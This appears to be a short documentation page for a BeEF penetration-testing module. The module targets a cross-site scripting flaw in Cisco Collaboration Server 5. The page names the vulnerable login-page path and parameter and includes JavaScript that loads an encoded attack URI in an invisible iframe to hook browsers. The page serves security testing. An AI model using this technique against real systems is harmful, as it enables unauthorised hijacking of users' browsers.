## Summary

* **Objective**: hook Cisco Collaboration Server 5 using XSS
* **Authors**: bcoles, s4squatch
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/xss/cisco_collaboration_server_5_xss)

## Internal Working

Use an invisible iframe to exploit XSS in Cisco Collaboration Server 5.

Vulnerable path is `http://target/webline/html/admin/wcs/LoginPage.jhtml?oper=&dest=`

```js
var uri = beef.encode.base64.decode('<%= Base64.strict_encode64(@uri) %>');

var cisco_collaboration_iframe = beef.dom.createInvisibleIframe();
cisco_collaboration_iframe.setAttribute('src', uri);
```

## Feedback
